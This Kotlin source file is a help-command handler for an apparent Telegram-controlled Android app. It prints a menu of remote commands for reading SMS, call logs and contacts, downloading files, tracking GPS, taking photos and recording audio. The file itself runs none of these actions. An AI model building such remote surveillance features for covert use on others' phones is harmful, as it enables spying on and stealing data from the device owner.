package com.soll.domain.command.handlers

import android.content.Context
import com.soll.data.api.model.Message
import com.soll.data.repository.TelegramRepository
import com.soll.domain.command.CommandHandler

class HelpHandler(
    context: Context,
    telegramRepository: TelegramRepository
) : CommandHandler(context, telegramRepository) {

    override val command = "help"
    override val description = "Show all available commands"

    override suspend fun execute(message: Message, args: String?) {
        val text = """
            |<b>Soll Commands</b>
            |
            |<b>System:</b>
            |/start - Welcome message
            |/help - This help message
            |/ping - Check bot status
            |/status - Device status
            |/info - Device information
            |/storage - Storage info
            |/logs - Recent command logs
            |
            |<b>Files:</b>
            |/files [path] - List files in directory
            |/download &lt;path&gt; - Download file
            |
            |<b>SMS &amp; Calls:</b>
            |/sms [count] - Read SMS (default 10)
            |/sms_send &lt;number&gt; &lt;text&gt; - Send SMS
            |/calls [count] - Call log (default 15)
            |/call &lt;number&gt; - Make a call
            |/contacts [query] - List or search contacts
            |
            |<b>Media:</b>
            |/location - Get GPS location
            |/photo [front|back] - Take photo
            |/record [seconds] - Record audio (max 60s)
            |
            |<b>Device Control:</b>
            |/notify [text] - Show notification
            |/vibrate [ms] - Vibrate (default 500ms)
            |/flashlight [on/off] - Toggle flashlight
            |/volume [0-100] - Set media volume
            |/brightness [0-100|auto] - Set brightness
            |/alarm [seconds] - Loud alarm (max 30s)
            |/bluetooth [on/off/status] - Bluetooth
            |/wifi - WiFi status
        """.trimMargin()

        reply(message, text)
    }
}
